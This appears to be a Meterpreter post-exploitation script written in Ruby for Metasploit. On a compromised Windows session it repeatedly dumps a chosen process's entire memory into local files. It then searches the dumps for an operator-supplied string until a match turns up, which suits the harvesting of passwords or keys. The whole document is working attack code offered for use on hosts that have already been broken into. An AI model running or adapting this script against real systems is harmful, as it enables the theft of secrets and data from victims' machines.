require 'fileutils'


if client.platform !~ /win32|win64/
	print_line "No compatible"
	raise Rex::Script::Completed
end

pid = nil
toggle = nil
exp = nil
interval = 10
match = true

def dump_mem(pid, toggle, filename, logs)
  host,port = @client.session_host, session.session_port
  #Dump file name
  dumpfile = logs + ::File::Separator + filename + ".dmp"
  print_status("\tDumping Memory...")
  begin
    dump_process = @client.sys.process.open(pid.to_i, PROCESS_READ)
  rescue
    print_error("Could not open process for reading memory!")
    #raise Rex::Script::Completed
  end
  # MaximumApplicationAddress for 32bit or close enough
  maximumapplicationaddress = 2147418111
  base_size = 0
  while base_size < maximumapplicationaddress
    mbi = dump_process.memory.query(base_size)
    # Check if Allocated
    if mbi["Available"].to_s == "false"
      file_local_write(dumpfile,mbi.inspect) if toggle
      file_local_write(dumpfile,dump_process.memory.read(mbi["BaseAddress"],mbi["RegionSize"]))
      print_status("\tbase size = #{base_size/1024}")
    end
    base_size += mbi["RegionSize"]
  end
  print_status("Saving Dumped Memory to #{dumpfile}")

end

opts = Rex::Parser::Arguments.new(
	"-h" => [false, "Help menu"],
	"-p" => [true, "Process ID"],
	"-e" => [true, "Expression"],
	"-i" => [true, "Interval between dumps"],
	"-m" => [false, "Finish?"]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Help Menu"
		print_line(opts.usage)
		raise Rex::Script::Completed
	when "-p"
		pid = val
	when "-e"
		exp = val
	when "-i"
		interval = val
	when "-m"
		match = val
	end
}

#main
salir  = false
filename = "1"
# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'scripts', 'process_monitor')
# Create the log directory
::FileUtils.mkdir_p(logs)

while !salir
	begin
		dump_mem(pid, toggle, filename, logs)
	rescue
	
	end
	#things...
	dumped = logs + ::File::Separator + filename + ".dmp"
	File.open(dumped,'r') do |b1|
		while linea = b1.gets
			if linea.include?(exp)
				print_good("yeah")
				puts linea
				salir = true
			end
		end
	end
	print_status("Waiting...")
        print_status("i: #{interval}")
	sleep(interval.to_i)
	filename = (filename.to_i + 1).to_s	
end
